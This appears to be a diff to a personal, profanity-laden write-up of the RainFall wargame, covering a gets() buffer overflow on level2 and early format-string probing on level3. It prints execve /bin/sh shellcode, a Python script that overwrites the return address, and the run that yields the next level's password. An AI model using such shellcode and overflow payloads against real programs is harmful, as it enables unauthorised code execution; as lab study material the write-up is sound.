@@ -362,3 +362,124 @@ shellcode
 ```
 "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
 ```
+## WTF is that, rewind
+So the executable calls a function p(), disassembling shows that it calls gets() **0x080484ed <+25>:    call   0x80483c0 <gets@plt>**, then prints whatever was entered
+
+The idea is to find an area to inject the shellcode into and later override RET's address **0x0804853e <+106>:   ret** with some address that with execute the shellcode
+
+hooooow, kill me
+
+**binary ninja**, the p function calls gets, then our strin/shellcode is returned in EAX, then puts is called  with that same EAX to print it, THEEEEN strdub is mysteriously called for no fucking reason and **our shellcode is left hanging**
+
+*so need to find a way to call it **a jump or call to the address is register somewhere***
+```
+level2@RainFall:~$ objdump -d level2 | grep "eax"
+.
+.
+ 80484cf:       ff d0                   call   *%eax
+```
+yay, found you motherfucker, so we will override the RET from the p function with that address **80484cf**
+
+### injecting
+So, we will have the shellcode injected then the address, shellcode is 26 bytes long, so 80 - 26 = 54, we will have shellcode + 54 character + [0x80484cf]
+```
+#!/usr/bin/python
+shellcode = '\x31\xd2\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x31\xc0\xb0\x0b\x89\xe3\x83\xe4\xf0\xcd\x80'
+print(shellcode + 54 * 'A' + '\xcf\x84\x04\x08')
+```
+Soooo
+```
+
+level2@RainFall:~$ (/tmp/a.py; cat) | ./level2 
+1�1�Qh//shh/bin1��
+                  ����̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAτ
+cat /home/user/level3/.pass
+492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+level2@RainFall:~$ su level3
+Password:492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
+```
+## level3
+executable calls gets then printf, so **format strings**
+### kill me/ more to learn
+```
+cmp     eax, 0x40
+```
+Love me these compares but useless
+```
+level3@RainFall:~$ gdb ./level3 
+(gdb) b main 
+Breakpoint 1 at 0x804851d
+(gdb) r
+Starting program: /home/user/level3/level3 
+
+Breakpoint 1, 0x0804851d in main ()
+(gdb) b v
+Breakpoint 2 at 0x80484ad
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080484ad in v ()
+(gdb) b *0x080484df
+Breakpoint 3 at 0x80484df
+(gdb) r
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080484ad in v ()
+(gdb) c
+Continuing.
+AAAAAAAAAAAa
+AAAAAAAAAAAa
+(gdb) set $eax=64
+(gdb) s
+Single stepping until exit from function v,
+which has no line number information.
+Wait what?!
+$ cat /home/user/level4/.pass
+cat: /home/user/level4/.pass: Permission denied
+$
+```
+*so it is useless*
+So after printf it compares a static variable **m**
+```
+mov     eax, dword [m]
+cmp     eax, 0x40
+---- objdump shows exact address
+0x080484da <+54>:    mov    0x804988c,%eax
+```
+the static variable is at ds:0x804988c at .bss section, after googling, the bss section is initialized at 0, then changed by progam during execution
+
+**so i guess we can change it using printf???, dk dc**
+### format string stuff
+Using %p to display stack
+
+## RE level2, suspecting because most guides override return address without even taking the address of a **JMP pr CALL**
+So 
+```
+level2@RainFall:~$ gdb ./level2
+(gdb) b main 
+Breakpoint 1 at 0x8048542
+(gdb) b p
+Breakpoint 2 at 0x80484da
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080484da in p ()
+(gdb) b *0x0804853d
+Breakpoint 3 at 0x804853d
+(gdb) c
+Continuing.
+AAAAAAAAA
+AAAAAAAAA
+
+Breakpoint 3, 0x0804853d in p ()
+(gdb) info frame
+Stack level 0, frame at 0xbffff730:
+ eip = 0x804853d in p; saved eip 0x804854a
+ called by frame at 0xbffff740
+ Arglist at 0xbffff728, args: 
+ Locals at 0xbffff728, Previous frame's sp is 0xbffff730
+ Saved registers:
+  ebp at 0xbffff728, eip at 0xbffff72c
+```
+breakpoint at leave instruction inside p function, now eip points to **0xbffff72c**
